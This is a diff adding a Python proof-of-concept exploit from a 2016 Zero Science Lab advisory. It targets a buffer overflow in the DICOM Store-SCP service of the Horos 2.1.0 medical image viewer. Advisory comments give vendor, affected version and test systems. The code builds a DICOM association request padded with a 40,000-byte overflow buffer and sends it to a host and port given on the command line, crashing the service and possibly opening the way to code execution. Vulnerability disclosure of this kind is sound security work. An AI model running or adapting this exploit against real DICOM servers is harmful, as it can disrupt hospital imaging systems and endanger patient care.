@@ -1,0 +1,68 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+#
+# Horos 2.1.0 DICOM Medical Image Viewer Remote Memory Overflow Vulnerability
+#
+#
+# Vendor: Horos Project
+# Product web page: https://www.horosproject.org
+# Affected version: 2.1.0
+#
+# Summary: Horos™ is an open-source, free medical image viewer. The goal of the Horos Project is
+# to develop a fully functional, 64-bit medical image viewer for OS X. Horos is based upon OsiriX
+# and other open source medical imaging libraries.
+#
+# Desc: The vulnerability is caused due to the usage of vulnerable collection of libraries that
+# are part of DCMTK Toolkit, specifically the parser for the DICOM Upper Layer Protocol or DUL.
+# Stack/Heap Buffer overflow/underflow can be triggered when sending and processing wrong length
+# of ACSE data structure received over the network by the DICOM Store-SCP service. An attacker can
+# overflow the stack and the heap of the process when sending large array of bytes to the presentation
+# context item length segment of the DICOM standard, potentially resulting in remote code execution
+# and/or denial of service scenario.
+#
+# Tested on: OS X 10.12.2 (Sierra)
+#            OS X 10.12.1 (Sierra)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5386
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5386.php
+#
+#
+# 15.12.2016
+#
+
+
+import sys, socket
+
+hello = ('\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
+         '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
+         '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
+         '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
+         '\x31\x20\x00\x80\x00')
+
+buffer = '\x41\x42\x43\x44' * 10000
+
+bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
+       '\x52\x00\x00\x00')
+
+if len(sys.argv) < 3:
+  print '\nUsage: ' +sys.argv[0]+ ' <target> <port>'
+  print 'Example: ' +sys.argv[0]+ ' 172.19.0.214 11112\n'
+  sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(251)
+s.send(hello+buffer+bye)
+s.close
